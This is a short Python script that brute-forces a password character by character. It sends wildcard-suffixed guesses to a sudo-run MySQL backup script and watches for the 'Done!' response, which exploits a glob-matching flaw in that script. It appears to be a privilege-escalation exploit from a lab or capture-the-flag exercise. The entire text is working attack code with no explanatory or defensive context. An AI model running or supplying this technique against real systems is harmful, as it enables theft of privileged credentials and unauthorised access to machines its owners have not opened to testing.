import string 
import subprocess

wordlist = string.ascii_letters + string.digits
c = ""

while True :
    for i in wordlist:
        entry = c + i + '*'
        process = subprocess.Popen(
        ["sudo", "/opt/scripts/mysql-backup.sh"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True)

        stdout, stderr = process.communicate(input=entry)

        if "Done!" in stdout:
            c += i
            print(c)
